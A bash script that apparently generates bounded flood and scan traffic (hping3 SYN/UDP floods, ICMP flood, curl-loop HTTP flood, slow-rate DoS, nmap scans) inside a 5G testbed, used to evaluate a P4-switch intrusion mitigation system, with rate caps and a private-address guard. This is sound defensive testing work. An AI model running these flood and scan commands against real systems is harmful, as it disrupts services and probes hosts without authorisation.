#!/bin/bash
# attack.sh - bounded, victim-only traffic generator for the RA3 evaluation.
#
# Runs INSIDE the compromised UE (ue-2). It produces one 5G-NIDD attack class at
# a time, aimed only at the testbed victim, through the 5G tunnel, so the P4
# switch sees it and RA3's mitigations can act. It is a lab test fixture, not a
# general tool: every mode is bounded (duration, rate, and/or packet count) and
# the target is a single address the caller passes in.
#
#   attack.sh <TYPE> <VICTIM_IP> [--duration S] [--pps N] [--dev IFACE]
#
# TYPE is a 5G-NIDD class:
#   ICMP_Flood UDP_Flood SYN_Flood HTTP_Flood Slowrate_DoS
#   SYN_Scan TCP_Connect_Scan UDP_Scan
#
# Defaults are modest because the approach2 datapath is a software switch
# (~50 Mbit/s): --duration 60, --pps 2000. Rates are capped at MAX_PPS.
set -euo pipefail

MAX_PPS="${MAX_PPS:-20000}"        # hard cap, whatever --pps asks for
TYPE="${1:?usage: attack.sh TYPE VICTIM_IP [opts]}"
VICTIM="${2:?need victim IP}"
shift 2
DURATION=60
PPS=2000
DEV=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --duration) DURATION="$2"; shift 2 ;;
    --pps)      PPS="$2"; shift 2 ;;
    --dev)      DEV="$2"; shift 2 ;;
    *) echo "unknown option: $1" >&2; exit 2 ;;
  esac
done

# Refuse to aim off-testbed: the victim must be a private address, and we only
# ever send to that single host.
case "$VICTIM" in
  10.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*|192.168.*) : ;;
  *) echo "refusing non-private target $VICTIM" >&2; exit 2 ;;
esac
[[ "$PPS" -le "$MAX_PPS" ]] || { echo "capping pps at $MAX_PPS" >&2; PPS="$MAX_PPS"; }

# Tunnel interface, so traffic goes UE -> gNB -> P4 switch -> UPF -> victim.
[[ -n "$DEV" ]] || DEV=$(ip -o -4 addr show | awk '/10\.45\./{print $2; exit}')
[[ -n "$DEV" ]] || { echo "no 10.45.x tunnel interface; is nr-ue up?" >&2; exit 1; }
SRC=$(ip -4 -o addr show "$DEV" | awk '{print $4}' | cut -d/ -f1)

# hping interval from pps: -i uX is microseconds between packets.
IVAL_US=$(( 1000000 / (PPS > 0 ? PPS : 1) ))
echo "[attack] $TYPE -> $VICTIM via $DEV (src $SRC) ${DURATION}s @ ~${PPS}pps"

flood_hping() {  # extra hping args for this attack, sent from the tunnel src
  timeout "$DURATION" hping3 "$@" -I "$DEV" -a "$SRC" -i "u$IVAL_US" -q "$VICTIM" \
    >/dev/null 2>&1 || true
}

case "$TYPE" in
  ICMP_Flood)
    timeout "$DURATION" ping -I "$DEV" -i "0.$(printf '%06d' $IVAL_US)" -q "$VICTIM" >/dev/null 2>&1 || true
    ;;
  UDP_Flood)
    flood_hping --udp -p 5060 -d 512 ;;
  SYN_Flood)
    # UE is a real host: it would RST the victim's SYN-ACK and clear the
    # half-open at once. Drop the return SYN-ACK so half-opens persist, as a
    # non-responsive attacker would. Rule removed when the flood ends.
    iptables -I INPUT -p tcp --sport 80 --tcp-flags SYN,ACK SYN,ACK -s "$VICTIM" -j DROP 2>/dev/null || true
    flood_hping -S -p 80
    iptables -D INPUT -p tcp --sport 80 --tcp-flags SYN,ACK SYN,ACK -s "$VICTIM" -j DROP 2>/dev/null || true ;;
  HTTP_Flood)
    end=$(( $(date +%s) + DURATION ))
    while [[ $(date +%s) -lt $end ]]; do
      for _ in $(seq 1 50); do
        curl -s -o /dev/null --interface "$DEV" --max-time 2 "http://$VICTIM/" & done
      wait; done ;;
  Slowrate_DoS)
    python3 /opt/attack/slowrate.py "$VICTIM" 80 --dev "$DEV" --src "$SRC" \
      --duration "$DURATION" --connections 200 ;;
  SYN_Scan)
    timeout "$DURATION" nmap -sS -e "$DEV" -p 1-1024 --max-rate "$PPS" "$VICTIM" >/dev/null 2>&1 || true ;;
  TCP_Connect_Scan)
    timeout "$DURATION" nmap -sT -e "$DEV" -p 1-1024 --max-rate "$PPS" "$VICTIM" >/dev/null 2>&1 || true ;;
  UDP_Scan)
    timeout "$DURATION" nmap -sU -e "$DEV" --top-ports 200 --max-rate "$PPS" "$VICTIM" >/dev/null 2>&1 || true ;;
  *)
    echo "unknown attack type: $TYPE" >&2; exit 2 ;;
esac
echo "[attack] $TYPE done"
